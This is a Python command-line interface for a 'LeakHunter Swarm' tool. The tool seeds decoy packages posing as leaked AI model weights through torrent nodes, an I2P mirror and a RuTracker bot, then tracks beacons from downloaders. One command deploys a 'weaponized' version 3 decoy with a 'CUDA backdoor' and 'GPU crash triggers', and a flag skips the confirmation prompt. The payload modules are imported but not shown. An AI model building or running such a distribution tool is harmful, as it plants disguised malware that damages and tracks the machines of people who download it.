#!/usr/bin/env python3
"""
LeakHunter Swarm CLI - Command Line Interface
Simplified interface for managing the LeakHunter Swarm system
"""

import argparse
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent))

from magnet_harvester import MagnetHarvester
from beacon_tracker import BeaconTracker
from asteroth_gate import AsterothGate
from swarm_guardians import SwarmGuardians
from rutracker_bot import RuTrackerBot
from decoy_v3_generator import DecoyV3Generator
from leakhunter_swarm import LeakHunterSwarm


def cmd_deploy_v2(args):
    """Deploy decoy version 2"""
    print("🚀 Deploying Decoy V2...")
    swarm = LeakHunterSwarm()
    deployment = swarm.deploy_decoy_v2()
    print(f"\n✅ Deployed to {len(deployment['platforms'])} platforms:")
    for platform, info in deployment['platforms'].items():
        print(f"  - {platform}: {info}")


def cmd_deploy_v3(args):
    """Deploy decoy version 3 with CUDA backdoor"""
    print("⚠️  WARNING: Deploying weaponized decoy with GPU crash triggers!")
    if not args.force:
        response = input("Type 'yes' to confirm: ")
        if response.lower() != 'yes':
            print("Deployment cancelled.")
            return
    
    print("\n🔥 Deploying Decoy V3...")
    swarm = LeakHunterSwarm()
    deployment = swarm.deploy_decoy_v3()
    print(f"\n✅ Deployed: {deployment['decoy']}")
    print(f"   CUDA backdoor: {'ACTIVE' if deployment['cuda_backdoor'] else 'INACTIVE'}")
    print(f"   Platforms: {len(deployment['platforms'])}")


def cmd_scoreboard(args):
    """Display real-time scoreboard"""
    swarm = LeakHunterSwarm()
    
    if args.simulate:
        print("🔄 Simulating beacon activity...")
        swarm.tracker.simulate_activity()
    
    swarm.print_global_scoreboard()


def cmd_status(args):
    """Show status of all components"""
    print("\n" + "="*60)
    print("📊 LEAKHUNTER SWARM - COMPONENT STATUS")
    print("="*60 + "\n")
    
    # Asteroth-Gate status
    print("1️⃣  Asteroth-Gate (Torrent Node)")
    node = AsterothGate()
    node.print_status()
    
    # Swarm Guardians status
    print("\n2️⃣  Swarm Guardians (I2P Mirror)")
    vm = SwarmGuardians()
    vm.print_status()
    
    # RuTracker Bot status
    print("\n3️⃣  RuTracker Bot")
    bot = RuTrackerBot()
    bot.print_status()


def cmd_generate_v3(args):
    """Generate decoy v3 package without deploying"""
    print("🔧 Generating Decoy V3 package...")
    generator = DecoyV3Generator()
    package = generator.create_decoy_package_v3(args.model_name)
    generator.print_decoy_info(package)
    
    if args.save:
        generator.save_decoy_data()
        print("\n✅ Package specification saved")


def cmd_beacon_track(args):
    """Track beacon signals"""
    tracker = BeaconTracker()
    
    if args.simulate:
        print("🔄 Simulating beacon activity...")
        tracker.simulate_activity()
    
    tracker.print_scoreboard()
    
    if args.save:
        tracker.save_beacons()
        print("\n✅ Beacon data saved")


def main():
    parser = argparse.ArgumentParser(
        description="LeakHunter Swarm CLI - Decoy Distribution & Beacon Tracking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Deploy decoy v2
  python cli.py deploy-v2
  
  # Deploy decoy v3 (GPU crasher)
  python cli.py deploy-v3 --force
  
  # View scoreboard
  python cli.py scoreboard
  
  # View component status
  python cli.py status
  
  # Generate v3 package
  python cli.py generate-v3 --model-name llama-405b
  
  # Track beacons
  python cli.py beacon-track --simulate
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # deploy-v2 command
    parser_v2 = subparsers.add_parser('deploy-v2', help='Deploy decoy version 2')
    parser_v2.set_defaults(func=cmd_deploy_v2)
    
    # deploy-v3 command
    parser_v3 = subparsers.add_parser('deploy-v3', help='Deploy decoy version 3 (GPU crasher)')
    parser_v3.add_argument('--force', action='store_true', help='Skip confirmation prompt')
    parser_v3.set_defaults(func=cmd_deploy_v3)
    
    # scoreboard command
    parser_score = subparsers.add_parser('scoreboard', help='Display real-time scoreboard')
    parser_score.add_argument('--simulate', action='store_true', help='Simulate beacon activity')
    parser_score.set_defaults(func=cmd_scoreboard)
    
    # status command
    parser_status = subparsers.add_parser('status', help='Show component status')
    parser_status.set_defaults(func=cmd_status)
    
    # generate-v3 command
    parser_gen = subparsers.add_parser('generate-v3', help='Generate decoy v3 package')
    parser_gen.add_argument('--model-name', default='llama-405b-instruct', help='Model name')
    parser_gen.add_argument('--save', action='store_true', help='Save package to file')
    parser_gen.set_defaults(func=cmd_generate_v3)
    
    # beacon-track command
    parser_beacon = subparsers.add_parser('beacon-track', help='Track beacon signals')
    parser_beacon.add_argument('--simulate', action='store_true', help='Simulate activity')
    parser_beacon.add_argument('--save', action='store_true', help='Save beacon data')
    parser_beacon.set_defaults(func=cmd_beacon_track)
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    # Execute command
    args.func(args)


if __name__ == '__main__':
    main()
